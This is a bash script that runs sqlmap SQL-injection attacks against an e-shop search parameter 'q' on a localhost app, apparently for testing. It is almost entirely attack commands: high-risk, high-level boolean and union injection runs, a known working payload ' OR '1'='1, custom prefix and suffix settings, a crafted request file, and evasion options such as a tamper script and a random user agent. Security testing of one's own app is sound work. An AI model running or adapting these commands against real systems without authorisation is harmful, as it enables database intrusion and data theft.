#!/bin/bash
# Advanced SQLMap test with custom settings for the LIKE clause vulnerability

echo "=== Advanced SQLMap Test for E-Shop SQL Injection ==="
echo ""
read -p "Enter your sessionid cookie value: " SESSION_ID

if [ -z "$SESSION_ID" ]; then
    echo "Error: Session ID is required!"
    exit 1
fi

TARGET="http://127.0.0.1:8000/?q=test"

echo ""
echo "[*] Testing with maximum aggression and custom payloads..."
echo ""

# Method 1: Force testing with high risk/level
echo "[1] High risk/level test..."
sqlmap -u "$TARGET" \
       --cookie="sessionid=$SESSION_ID" \
       --batch \
       --risk=3 \
       --level=5 \
       --dbms=SQLite \
       --technique=B \
       --string="product-card" \
       --not-string="Δεν βρέθηκαν προϊόντα" \
       -p q \
       --skip-waf \
       --force-ssl=false \
       --flush-session

echo ""
echo "[2] Testing with custom injection points..."
# Since we know ' OR '1'='1 works, let's tell SQLMap about it
sqlmap -u "$TARGET" \
       --cookie="sessionid=$SESSION_ID" \
       --batch \
       --dbms=SQLite \
       --technique=U \
       --union-cols=6 \
       --union-char="'11111111-1111-1111-1111-111111111111'" \
       -p q \
       --prefix="'" \
       --suffix="OR '1'='1" \
       --skip-waf

echo ""
echo "[3] Manual payload test..."
# Test with a known working payload
WORKING_PAYLOAD="' OR '1'='1"
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$WORKING_PAYLOAD'''))")
echo "Testing with known working payload: $WORKING_PAYLOAD"

sqlmap -u "http://127.0.0.1:8000/?q=$ENCODED_PAYLOAD" \
       --cookie="sessionid=$SESSION_ID" \
       --batch \
       --dbms=SQLite \
       --technique=U \
       --union-cols=6 \
       --level=5 \
       --risk=3

echo ""
echo "[4] Alternative: Using request file..."
# Create a request file
cat > /tmp/eshop_request.txt << EOF
GET /?q=test HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0
Cookie: sessionid=$SESSION_ID
Connection: close

EOF

echo "Testing with request file..."
sqlmap -r /tmp/eshop_request.txt \
       --batch \
       --dbms=SQLite \
       --risk=3 \
       --level=5 \
       -p q \
       --tamper=space2comment \
       --random-agent